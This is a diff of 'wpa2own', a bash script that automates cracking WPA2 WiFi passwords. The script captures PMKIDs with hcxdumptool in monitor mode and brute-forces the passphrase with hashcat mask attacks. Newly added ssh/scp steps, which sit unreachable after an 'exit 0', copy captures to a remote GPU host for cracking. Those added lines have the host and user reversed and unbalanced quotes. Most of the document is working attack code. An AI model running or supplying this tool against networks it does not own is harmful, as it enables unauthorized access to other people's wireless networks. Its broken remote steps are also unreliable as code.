@@ -1,17 +1,32 @@
 #!/bin/bash
 
-# wpa2own (see README.md for details, usage, gotchas and license)
-
 set -e
 
-#### variables
-# package capture file maximum size in megabytes (salt to taste)
+####
+#### wpa2own 
+#### For details, usage, gotchas and license
+#### see: https://github.com/philcryer/wpa2own
+####
+
+####
+#### Variables
+####
+# SET remote host varibles to run hashcat on
+remote_host="host.name.com"
+remote_user="luser"
+remote_port="22"
+
+# SET package capture file maximum size in megabytes
 pcap_max_size="10"
+
 # no need to modify the following variables
 timestamp=$(date +%s)
 this_arch=$(arch)
 this_uname=$(uname)
 
+####
+#### Functions
+####
 function rainbowsh(){
 	#  Copyright 2013 Manuel Gutierrez <dhunterkde@gmail.com>
 	#  https://github.com/xr09/rainbow.sh
@@ -78,10 +93,12 @@ cat << "EOF"
   \ V  V /| |_) | (_| |/ __| (_) \ V  V /| | | |
    \_/\_/ | .__/ \__,_|_____\___/ \_/\_/ |_| |_|
 EOF
-echo "   v`cat VERSION` |_|  `shuf -n 1 txt/slogans`"
+echo "   v`cat VERSION` |_| `shuf -n 1 txt/slogans`"
 }
 
 wpa2own_preflight(){
+    	# verify that system is compatible 
+	echo -n "$prompt_adj" "  System: "
 	if [ $this_uname != "Linux" ]; then
 		echo "failed";echo "$prompt_error" "  Error: this script only supports Linux"
 		echo "$prompt_end"
@@ -158,9 +175,10 @@ function stage1-config(){
 		fi
 		cd hashcat
 		git submodule update --init
-		make
-		mv hashcat ../../bin/
-		cd ../..
+	# only build on the server we're going to run on
+	#	make
+	#	mv hashcat ../../bin/
+	#	cd ../..
         else
 		echo "$prompt_okstatus"
 	fi
@@ -177,17 +195,17 @@ function stage1-config(){
         else
 		echo "$prompt_okstatus"
 	fi
-	echo -n "$prompt_adj" "  Software: making all binaries executeable"
+	echo -n "$prompt_adj" "  Software: making all binaries executeable "
 	chmod a+x bin/*
 	echo "$prompt_okstatus"
 }
 
 function stage2-capture(){
-	# this will guess a network interface to use, if this fails, you might have to hardcode this like:
-	#my_interface="wlan0"
-
-	#TODO maybe use iwconfig to guess wireless nic?
+	# this will guess a network interface to use
+	# TODO maybe use iwconfig to guess wireless nic?
 	my_interface=$(./bin/hcxdumptool -I | tail -n1 | cut -d" " -f2)
+	# NOTE if this fails, you might have to hardcode this like:
+	#my_interface="wlan0"
 
 	# turn on monitor mode - again, your networking interface must support monitor mode
 	# if it doesn't, this will fail, and everything else will too :(
@@ -198,45 +216,58 @@ function stage2-capture(){
 
 	# clear existing pcap if found
 	#if [ ! -f "out/$timestamp.pcapng" ]; then rm -f out/$timestamp.pcapng; fi
-	echo "$prompt_adj" "  - running package capture on interface $my_interface"
+
+	echo "$prompt_adj" "  running package capture on interface $my_interface"
+	echo "$prompt_adj" "  run this for at least 10 minutes, look for the message"
+	echo "$prompt_adj" "  look for the message [FOUND PMKID] then hit control-c"
+	cd out
+
+	# TODO create filterlist if APs?
+	#sudo ./hcxdumptool -o new.pcapng -i $my_interface --enable_status=1 --filtermode=2 --filterlist=filter.txt
 
 	# run hcxdumptool to capture traffic, build a pcap
-	echo "** you may need to run this for 10 minute, look for the message [FOUND PMKID] then ctrl-c **"
-	cd out
-	# TODO create filterlist 
-	#sudo ./hcxdumptool -o new.pcapng -i $my_interface --enable_status=1 --filtermode=2 --filterlist=filter.txt
 	sudo ../bin/hcxdumptool -o $timestamp.pcapng -i $my_interface --enable_status=1
+
+	# TODO have it create more output (needs testing)
 	#../bin/hcxpcaptool -E essidlist -I identitylist -U usernamelist -z $timestamp.16800 $timestamp.pcapng
 }
 
 function stage3-crack(){
-	echo "$prompt_adj" "  - transfer file $timestamp.pcapng to GPU rig for cracking"
+	echo "$prompt_adj" "  transferring file $timestamp.pcapng to GPU rig for cracking"
 	#echo "** using hashcat to try and get the WPA PSK **"
 	#echo "$prompt_adj" "  - running hashcat across package capture file"
 	#../bin/hashcat -m 16800 $timestamp.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
 	# or ./bin/hashcat-legacy $timestamp.pcapng -a 3 '?l?l?l?l?l?lt!'
-	echo "$prompt_adj" "  - then run: ./bin/hashcat-legacy $timestamp.pcapng -a 3 '?l?l?l?l?l?lt!'"
+	echo "$prompt_adj" "  NOTE this manual for now. Transfer the file to the remote system"
+	echo "$prompt_adj" "  then run: hashcat $timestamp.pcapng -a 3 '?l?l?l?l?l?lt!'"
+exit 0
+	# scp files to remote host
+	# make directory on remote host
+ 	ssh -p $remote_port $remote_host@$remote_user -C 'mkdir -p $HOME/wpa2own/bin'
+	# copy files to remote host
+ 	scp -P $remote_port -r out src/hashcat $remote_host@$remote_user:$HOME/wpa2own
+	# compile hashcat on remote host
+ 	ssh -p $remote_port $remote_host@$remote_user -C 'cd $HOME/wpa2own/hashcat; make; chmod 755 hashcat; mv hashcat ../bin'
+	# run hashcat on remote host
+ 	ssh -p $remote_port $remote_host@$remote_user -C 'cd $HOME/wpa2own; ./bin/hashcat out/$timestamp.pcapng -a 3 '?l?l?l?l?l?lt!'
 }
 
-# Run the program
-clear
-rainbowsh
-rainbowsh_prompt
-wpa2own_logo
-
+####
+#### Program
+####
+clear; rainbowsh; rainbowsh_prompt; wpa2own_logo 
 echo;echo "$prompt_start"
-echo "$prompt_verb" "Stage 0"
-echo -n "$prompt_adj" "  System: "
 
+echo "$prompt_verb" "Stage 0 - preflight"
 wpa2own_preflight
 
-echo "$prompt_verb" "Stage 1"
+echo "$prompt_verb" "Stage 1 - gathering"
 stage1-config
 
-echo "$prompt_verb" "Stage 2"
-stage2-capture
+echo "$prompt_verb" "Stage 2 - discovering"
+#stage2-capture
 
-echo "$prompt_verb" "Stage 3"
+echo "$prompt_verb" "Stage 3 - cracking"
 stage3-crack
 
 echo "$prompt_end"
